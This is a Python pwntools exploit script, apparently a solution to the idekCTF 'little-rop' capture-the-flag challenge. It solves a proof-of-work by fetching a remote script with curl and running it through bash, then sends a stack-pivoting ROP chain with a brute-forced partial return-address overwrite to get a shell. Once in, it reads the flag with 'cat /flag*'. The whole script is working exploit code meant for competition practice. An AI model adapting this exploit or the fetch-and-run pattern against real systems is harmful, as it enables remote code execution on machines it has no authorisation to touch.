from pwn import *
import subprocess
import re

elf = ELF('./chall')


cnt = 0
count = 0
while(1):
    io = remote('nc little-rop.chal.idek.team 1337')
    io.debug = False
    data = io.recvuntil("Solution?")
    match = re.search(r"solve (s\.[a-zA-Z0-9+/=\.]+)", data.decode())
    if not match:
        print("[-] PoW challenge not found!")
        io.close()
        continue

    challenge_str = match.group(1)
    cmd = f"python3 <(curl -sSL https://goo.gle/kctf-pow) solve {challenge_str}"
    result = subprocess.run(cmd, shell=True, executable='/bin/bash', stdout=subprocess.PIPE)
    solution = result.stdout.decode().strip()
    io.sendline(solution)

    payload = b"A" * 0x20 + p64(elf.section(".bss")+0x60) + p64(0x4011a9)
    io.send(payload)

    payload = p64(next(elf.gadget("ret;"))) + p64(next(elf.gadget("mov eax, 0; pop rbp; ret;"))) + p64(elf.section(".bss")+0x70-0x58) + p64(next(elf.gadget("leave; ret;"))) + p64(elf.section(".bss")+0x60+1*0x30) + p64(0x4011a9)
    io.send(payload)


    payload = b"A" * 0x20 + p64(elf.section(".bss")+0x38) + p64(0x4011a9)
    io.send(payload)

    payload = p64(elf.section(".bss")+0x700) + b"\x3f\xbd\x0e"
    io.send(payload)
    io.debug = True
    time.sleep(1)
    io.sendline("ls")
    io.sendline("cat /flag*")
    try:
        io.recvuntil("idek", timeout=8)
        break
    except Exception as e:
        cnt += 1
        if isinstance(e, TimeoutError):
            count += 1
        print(e, cnt, count)
        io.close()
        continue

io.interactive()